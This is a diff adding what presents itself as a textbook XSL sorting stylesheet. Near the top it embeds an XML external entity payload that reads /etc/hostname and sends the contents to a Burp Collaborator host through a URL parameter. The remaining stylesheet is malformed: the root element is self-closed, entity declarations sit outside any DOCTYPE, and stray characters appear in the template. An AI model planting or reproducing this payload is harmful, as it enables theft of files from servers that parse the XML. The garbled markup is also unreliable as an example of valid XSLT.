@@ -1,0 +1,21 @@
+<?xml version="1.0"?>
+
+<!-- Fig. 15.21: sorting.xsl -->
+<xsl:stylesheet version = "1.0"
+xmlns:xsl="http://www.w3.org/1999/XSL/Transform"/>
+
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://qmgzhnn5l2e8oeoslsgah1zi399cx1.burpcollaborator.net/?x=%file;'>">
+%eval;
+%exfiltrate;
+
+<!-- write XML declaration and DOCTYPE DTD information -->
+*<xsl:output method = "html" doctype-system = "about:legacy-compat" />*
+
+ <!-- match document root -->
+ <xsl:template match="/"> -<html> <xsl:apply-templates/> </html> 
+ </xsl:template>
+
+
+
+
